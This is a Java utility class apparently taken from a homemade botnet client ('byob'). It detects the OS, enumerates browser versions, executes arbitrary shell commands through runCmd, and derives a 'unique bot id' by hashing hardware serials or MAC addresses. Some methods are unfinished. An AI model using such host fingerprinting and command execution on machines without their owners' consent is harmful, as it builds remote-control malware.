/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package byob_v1;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author diomenik
 */
public class Tools {

    public static String getOs(){
        return System.getProperty("os.name");
    }
    
    public static String getBrowsers(){
        
        String browsers = "";
        String tmp;
        if(getOs().toLowerCase().contains("linux")){
            tmp = linuxTermOut("google-chrome --version");
            System.out.println(tmp);
            tmp = linuxTermOut("firefox --version");
            System.out.println(tmp);
            tmp = "Opera ".concat(linuxTermOut("opera --version"));
            System.out.println(tmp);
            tmp = linuxTermOut("chromium-browser --version");
            System.out.println(tmp);
            //Scrivi tutto su browsers
        }
        else if(getOs().toLowerCase().contains("windows")){
            
        }
        else if(getOs().toLowerCase().contains("osx")){ //???
            
        }
        else
            browsers = "Unrecognized OS";
        return browsers;
    }
    
    private static String linuxTermOut(String cmd){
        String[] args = new String[] {"/bin/bash", "-c", cmd};
            String out = "";
            try {
                Process proc = new ProcessBuilder(args).start();
                BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                out = br.readLine();
            } catch (IOException ex) {
                Logger.getLogger(Tools.class.getName()).log(Level.SEVERE, null, ex);
            }
            return out;
    }
    
    /**
     * The function runs a command on the host's command line and captures
     * the result fromthe console.
     * @param command   command to be run
     * @return output from the command line
     */
    public static String runCmd(String command) {
        String cmdOutput = "";
        String _string = null;

        try {
            Process _process = Runtime.getRuntime().exec(command);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(_process.getInputStream()));
            while((_string = stdInput.readLine()) != null) {
                cmdOutput += _string+"\n";
            }
        }

        catch(IOException e) {
            e.printStackTrace();
        }
        
        return cmdOutput;
        }
    
    /**
     * Th function returns a unique bot id using a hash of the host hardware
     * information. 
     * @return unique ID of the bot
     */
    public String idGeneration() {
        String hardware = "";
        String command = "";
        switch(getOs().toUpperCase()){
            case "LINUX":
                //command = "lshw | grep -e serial -e product | grep -v Controller | grep -v None";
                command = "lshw | grep -e serial";
                break;
                
            case "OSX":
                command = "ifconfig en0 | grep ether";
                break;
                
            case "WINDOWS":
                command = "getmac";
                break;
        }
        
        hardware = Tools.runCmd(command);
        return hashFunction(hardware);
    }
    
    /**
     * The function returns the MD5 Checksum of a string.
     * @param hw the string youwant to compute the checksum of
     * @returnthe checksum of the string
     */
    public static String hashFunction(String hw) {
        
        byte[] bytesMsg = null;
        byte[] bytesDigest = null;
        MessageDigest md = null;
        String hashText = "";
        
        try {
            bytesMsg = hw.getBytes("UTF-8");
        }
        catch(UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        
        try {
            md = MessageDigest.getInstance("MD5");
        }
        catch(NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        
        bytesDigest = md.digest(bytesMsg);
        hashText = (new BigInteger(1, bytesDigest)).toString(16);
        while(hashText.length() < 32) {
            hashText = "0"+hashText;
        }
        
        return hashText;
    }
    }
